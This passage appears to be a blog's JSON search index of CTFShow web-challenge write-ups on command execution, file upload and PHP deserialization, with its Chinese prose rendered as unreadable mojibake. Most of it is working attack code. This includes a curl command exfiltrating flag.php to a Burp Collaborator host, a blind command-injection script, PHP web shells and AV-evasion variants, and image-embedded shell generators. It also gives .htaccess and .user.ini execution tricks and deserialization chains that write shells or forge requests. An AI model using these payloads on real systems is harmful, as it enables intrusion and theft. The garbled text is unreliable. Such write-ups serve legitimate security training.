===\"admin\"\n\nåé¢æœ‰æˆ–ï¼Œæ‰€ä»¥æ»¡è¶³username==='admin'å³å¯\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[éªšæ“ä½œ](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\næˆ‘ä»¬ä¼ é€’?F=`$F`;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤\n**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**\nå› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„`$F`;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°\nè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚\nè€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„`$F`;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯\n`$F`;\n$Få˜é‡å†…å®¹å°±æ˜¯æˆ‘ä»¬æœ€ç»ˆæ‰§è¡Œçš„å†…å®¹\n```\n\nä½¿ç”¨ä¸€æŠŠburpè‡ªå¸¦çš„åŠŸèƒ½ï¼ŒBurp Collaboratorï¼Œç›¸è¾ƒäºDNSLogçš„å¥½å¤„å°±æ˜¯å¯ä»¥å¸¦å‡ºPOSTä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æºå¸¦Cookie\n\nè¿˜æœ‰curlå‘½ä»¤çš„ä½¿ç”¨\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-09 15.18.07.png)\n\n**134**\n\nphpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\nåŒä¹‹å‰æˆ–è€…ç›´æ¥mvæ”¹å\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nbanäº†ä¸€å †å‘½ä»¤ï¼Œéœ€è¦å›æ˜¾ï¼Œä½¿ç”¨Linux teeå‘½ä»¤\n\nTeeæ˜¯Linuxå‘½ä»¤ï¼Œç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚\n\n```\nå‘½ä»¤|tee è¾“å‡ºæ–‡ä»¶\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\næŸ¥çœ‹/1æ–‡ä»¶å³å¯\n```\n\n**137**\n\ncall_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•æ—¶ï¼Œä½¿ç”¨::å¦‚class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\nè°ƒç”¨è¿˜èƒ½ä¼ æ•°ç»„\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\nè‡ªåŠ¨è·³è½¬æˆ‘è°¢è°¢ä½ å•Š\n\næˆ‘æ˜¯çœŸå¦¹æƒ³åˆ°è¿™ç©æ„è¿˜èƒ½ç›²æ³¨\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#è·å–å°å†™å­—æ¯ä¸æ•°å­—\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintvalæŠŠå­—ç¬¦ä¸²è½¬æˆ0ï¼Œ0=='å­—ç¬¦ä¸²'ç»“æœä¸ºçœŸ\n\næ‰¾ä¿©å‡½æ•°è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²å°±è¡Œ\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[ç»•è¿‡æ— å­—æ¯æ•°å­—æ–¹æ³•](https://blog.csdn.net/miuzzx/article/details/109143413)\n\nä½¿ç”¨å–åæ³•\n\n```\npayloadï¼š\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\nå„ç§è¿›åˆ¶å–é›¶å°±è¡Œ\n\n**143**\n"},{"title":"CTFShowæ–‡ä»¶ä¸Šä¼ ","url":"/2022/03/30/CTFShowæ–‡ä»¶ä¸Šä¼ /","content":"\n**151**\n\nå‰ç«¯æ ¡éªŒï¼Œç›´æ¥ç»•è¿‡\n\n**152**\n\nContent/Typeæ ¡éªŒï¼Œç›´æ¥ç»•è¿‡\n\n**153**\n\næ–‡ä»¶åç¼€åæ ¡éªŒï¼Œå°è¯•ä½¿ç”¨php5,phtmlç­‰æ–‡ä»¶å¤±è´¥ï¼Œåº·åº·wpå­¦ä¹ æ–°çŸ¥è¯†ï¼ŒæŸ¥çœ‹å“åº” å¤´å‘ç°ä¸­é—´ä»¶æ˜¯nginx\n\n```\nnginxä¸­å’Œapacheçš„.htacessæœ‰ç›¸åŒä½œç”¨çš„æ–‡ä»¶æ˜¯.user.iniï¼Œè¿›ä¸€æ­¥æ‹“å±•ï¼Œphpä¸­çš„é»˜è®¤é…ç½®æ–‡ä»¶å®ä¸ºphp.iniï¼Œè€Œphp.iniæœ‰å››ç§é…ç½®æ¨¡å¼\n\nPHP_INI_USER\t\t\tå¯ä»¥åœ¨user.iniä¸­è®¾å®š\nPHP_INI_PERDIR\t\tå¯ä»¥åœ¨php.ini,.htacess,httpd.confä¸­è®¾å®š\nPHP_INI_SYSTEM\t\tå¯ä»¥åœ¨php.ini,httpd.confä¸­è®¾å®š\nPHP_INI_ALL\t\t\t\téšæ„è®¾å®š\n\nå¹¶ä¸”é™¤äº†php.iniæ–‡ä»¶ä¹‹å¤–ï¼Œphpè¿˜ä¼šä»å½“å‰ç›®å½•åˆ°webæ ¹ç›®å½•ä¸‹é€çº§æœç´¢iniæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨ä¸–çºªæ“ä½œä¸­é™¤äº†PHP_INI_SYSTEMä¸­çš„å†…å®¹éƒ½å¯ä»¥é€šè¿‡.user.iniè¿›è¡Œè®¾å®š\n\né‚£ä¹ˆuser.iniä¸­å®é™…æœ‰ç”¨çš„é…ç½®é¡¹æœ‰ä¸¤ä¸ªï¼š\nauto_append_file \t//åœ¨php4.2.3åŠä»¥å‰æ˜¯PHP_INI_ALLé‡Œé¢çš„ï¼Œåé¢å˜æˆäº†PHP_INI_PERDID\nauto_prepend_file\nè¿™ä¸¤é¡¹çš„åŠŸèƒ½æ˜¯åˆ¶å®šä¸€ä¸ªæ–‡ä»¶åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶ä¹‹å/ä¹‹å‰ï¼Œç±»ä¼¼å¸®åŠ©åŸå§‹æ–‡ä»¶æ·»åŠ ä¸€ä¸ªrequire(æŸæ–‡ä»¶)\n```\n\næ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯å°†æœ¨é©¬ä¸Šä¼ åå†ä¸Šä¼ .user.iniè®¾ç½®åŒ…å«æœ¨é©¬å³å¯\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†phpï¼Œå¤§å°å†™ç»•è¿‡\n\n**155**\n\nä¸¥æ ¼è¿‡æ»¤phpï¼Œæ‰€ä»¥å¤§å°å†™è¿‡ä¸å»äº†ï¼ŒçŸ­æ ‡ç­¾ç»•è¿‡\n\n```PHP\nå½“phpå‚æ•°:short_open_tag = Onæ—¶ï¼Œphpå¯ä»¥è§£æçŸ­æ ‡ç­¾å†…å®¹\nphpä¸­å¸¸è§çš„å››ç§æ ‡ç­¾çš„å†™æ³•ï¼š\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//è¿™ç§å†™æ³•åœ¨phpé…ç½®ä¸­é»˜è®¤å…³é—­äº†çš„ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å‡ºä¸€è¡Œ3.å¦‚æœè¦æ­£å¸¸è¾“å‡ºï¼Œéœ€è¦é…ç½®php.iniæ–‡ä»¶ã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°asp_tags=off ,å°†offæ”¹ä¸ºonã€‚æ”¹åŠ¨é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯apacheã€‚ \n<script language=â€phpâ€> echo \"CTF\"; </script>\n\nè¿˜æœ‰ä¸€ç§ç¥å¥‡å†™æ³•ä»¥åä¼šç”¨åˆ°\n<?=(è¡¨è¾¾å¼)?>  ç­‰ä»·äº <?php echo (è¡¨è¾¾å¼)?> //æ— é™åˆ¶  \n```\n\n**156**\n\nè¿‡æ»¤äº†`[  ]`ï¼Œå¯ç”¨`{  }`ä»£æ›¿\n\n**157**\n\nè¿‡æ»¤äº†åˆ†å·å’ŒèŠ±æ‹¬å·ï¼Œç”¨ä¸Šé¢çš„ç¥å¥‡å†™æ³•ç›´æ¥æ‰§è¡Œ`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\nåŒä¸Š\n\n**159**\n\nsystemè²Œä¼¼æ²¡äº†ï¼Œç”¨`<?=nl ``../fl*``?>`\n\n**160**\n\nåå¼•å·éƒ½æ²¡äº†ï¼Œåªèƒ½å°è¯•åŒ…å«è®¿é—®æ—¥å¿—äº†\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//ç©ºæ ¼éƒ½æ²¡ç»™ç•™å°±ç¦»è°±\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\nå¢åŠ äº†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œå…¶ä½™åŒä¸Š\n\n**162**\n\n.å’Œflagè¢«è¿‡æ»¤ï¼Œsessionæ–‡ä»¶çš„ç«äº‰åŒ…å«ï¼Œéš”å£æ–‡ä»¶åŒ…å«æœ‰åŸå› \n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"é“¾æ¥\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\n**163**\n\nåŒä¸Š\n\n**164**\n\npngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“\n\n```\nåœ¨phpä¸­åŒ…å«éœ€è¦æ¸²æŸ“çš„ä»£ç æ—¶\n```\n\nç›´æ¥ç”¨å¤§ä½¬è„šæœ¬ç”Ÿæˆä¸€å¼ å›¾ç‰‡å’¯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„\n/*\næœ¨é©¬å†…å®¹\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\nç”¨æ³•  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\næç¤ºä¸­ä¸ºhttpdï¼Œè‚¯å®šä¸apacheæœ‰å…³ï¼Œå°è¯•è§£ææ¼æ´ï¼Œä¸Šä¼ shell.php.xxxå‘ç°æ‰§è¡Œå¤±è´¥ï¼Œå°è¯•ä¸Šä¼ .htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\næˆ–è€…\nAddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp\n```\n\nOK\n\n**168**\n\næ„é€ å…æ€æœ¨é©¬\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShowååºåˆ—åŒ–","url":"/2022/03/24/CTFshowååºåˆ—åŒ–/","content":"\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\næŒ‰ç…§é¢˜ä¸­å…¨ç­‰äºç›´æ¥æ„é€ å³å¯\n\n**255-257**\n\næ„é€ å°±è¡Œ\n\n**258**\n\nè¿‡æ»¤äº†`O:æ•°å­—`çš„å½¢å¼ï¼Œåœ¨å†’å·ååŠ +å³å¯ï¼ŒURLdecodeä¼šè‡ªåŠ¨è§£ææˆè¿æ¥çš„\n\n**259**\n\nä»€ä¹ˆç©æ„è·³è¿‡äº†\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\nç°æºœæºœçš„å›æ¥çœ‹WP\n\n```\nå¦‚æœè°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å®šä¹‰çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ç±»æœ¬èº«çš„callæ–¹æ³•ã€‚ç”±äºç»™äº†ä¸ªssrfçš„ä»£ç ï¼Œé‚£ä¹ˆæ²³é‡Œæ¨æ–­è¿™æ˜¯ä¸€ä¸ªssrfçš„åŸç”Ÿç±»ã€‚\n```\n\n\n\n```PHP\n//PHPä¸­åŸç”Ÿç±»\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//å¯ä»¥å¾—çŸ¥æ„é€ SoapClientçš„ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå­—ç¬¦ä¸²$wsdlå’Œæ•°ç»„$options\n```\n\n```php\nåœ¨æ„é€ SoapClientç±»æ—¶ï¼Œä¼ å…¥æ•°ç»„å‚æ•°ä¸ºï¼š\narray('uri'=>'http://é“¾æ¥','location'=>'http://é“¾æ¥/æ–‡ä»¶','user_agent'=>'UAå¤´')\nè¯¥ç±»çš„__callæ–¹æ³•å¯æ„é€ è¯·æ±‚ä½¿å…¶å¯¹æŒ‡å®šURLå‘èµ·POSTè¯·æ±‚\næ‰€ä»¥æ„é€ è¯¥ç±»ä»£ç å¦‚ä¸‹\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*ç›¸å½“äºæ„é€ å‡ºä»¥ä¸‹è¯·æ±‚\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //ç”±äºContent-Lengthå·²ç»ç¡®å®šï¼Œæ‰€ä»¥åé¢è¯¥ç±»è‡ªè¡Œæ„é€ çš„è¯·æ±‚å¤´å¤±æ•ˆ\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\nå°±è¾“å…¥é‚£ä¸²å­—ç¬¦å°±è¡Œ\n\n**261**\n\nçŸ¥è¯†ç‚¹ï¼šåœ¨7.4ä»¥ä¸Šç‰ˆæœ¬ååºåˆ—åŒ–ä¼šç»•è¿‡__wakeup()å‡½æ•°\n\n$this->code==0x36dæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œ0x36dåˆæœ‰æ²¡æœ‰æ‰“å¼•å·ï¼Œæ‰€ä»¥ä»£è¡¨æ•°å­—877ï¼Œæ„é€ æ—¶ä½¿ç”¨877å¼€å¤´çš„æ–‡ä»¶å³å¯ï¼Œæœ€ç»ˆæ„é€ å†…å®¹å¦‚ä¸‹\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //è¿™é‡Œè®°å¾—è½¬è¯‘ï¼Œä¸ç„¶ä¼šè®©ä½ ä¼ å…¥kkkå‚æ•°çš„\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//æ— è¯­Windows DefenceæŠŠæˆ‘æ–‡ä»¶åˆ äº†ğŸ˜…\n```\n\n**262**\n\nç®€å•è½»æ¾è§£æ³•ï¼š\n\nåœ¨message.phpä¸­ç›´æ¥æ„é€ token=adminçš„ç±»\n\nå›°éš¾å­¦ä¹ è§£æ³•ï¼š\n\n**263**\n\nèœç‹—ç›´æ¥wp\n\né¦–å…ˆçœ‹\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//æ˜æ˜¾limtiå†™é”™äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä»£ç æ°¸è¿œæ‰§è¡Œçš„æ˜¯$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sessionä¸­çš„å†…å®¹\n```\n\nçŸ¥è¯†ç‚¹ï¼šsessionåœ¨å­˜å‚¨æ—¶æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯phpï¼Œä¸€ç§æ˜¯php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//phpå­˜å‚¨ï¼šuser|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serializeå­˜å‚¨ï¼ša:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\nå‘ç°è¯¡å¼‚çš„ç‚¹äº†å—ï¼Œåœ¨phpå­˜å‚¨ä¸­ï¼Œï½œæ˜¯ç”¨æ¥åˆ†ç¦»å˜é‡åå’Œåºåˆ—åŒ–åçš„å†…å®¹çš„ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬æ„é€ å‡ºåºåˆ—åŒ–å¥½çš„å†…å®¹å¹¶ä¸”åœ¨å‰é¢åŠ ï½œå°±å¯ä»¥è®©ç¨‹åºè¿›è¡Œè‡ªåŠ¨ååºåˆ—åŒ–\n\nç»§ç»­æŸ¥çœ‹inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"ä½¿ç”¨\".$this->password.\"ç™»é™†\".($this->status?\"æˆåŠŸ\":\"å¤±è´¥\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\nå…¶ä¸­åŒ…å«`file_put_contents`å‡½æ•°å¯è¿›è¡Œä¸€å¥è¯æœ¨é©¬çš„å†™å…¥\n\næœ€ç»ˆæ„é€ å¦‚ä¸‹\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\né¦–å…ˆä¿®æ”¹cookieè®¿é—®ä¸»é¡µï¼Œç„¶åè®¿é—®/check.phpä½¿å¾—æœ¨é©¬æ–‡ä»¶è¢«å†™å…¥ï¼Œæœ€åè®¿é—®/log-1.phpå³å¯\n\n264\n\n**265**\n\nåœ°å€ä¼ å‚\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\nåŒ¹é…æŠ›å‡ºå¼‚å¸¸å__destrurtä¸è§¦å‘ï¼Œæ‰€ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯\n\n**267**\n\nyiiæ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåˆ©ç”¨çš„ç±»\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\nè¿™é‡Œçš„$this->_dataReaderå†…å®¹å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä¸å­˜åœ¨closeæ–¹æ³•å¹¶ä¸”å­˜åœ¨__callæ–¹æ³•çš„ç±»ï¼Œå…¨å±€æœç´¢__callæ–¹æ³•åï¼Œå‘ç°åœ¨\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\nè·Ÿè¿›format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\nè·Ÿè¿›getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//è¿™é‡Œä¼šè¿”å›ä¼ å…¥çš„$formatterçš„å€¼\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\nå‘ç°formatæ–¹æ³•ä¸­çš„call_user_func_arrayçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œæƒ³è¦åˆ©ç”¨è¿›è€ŒæŸ¥æ‰¾è°ƒç”¨äº†call_user_funcå‡½æ•°çš„æ— 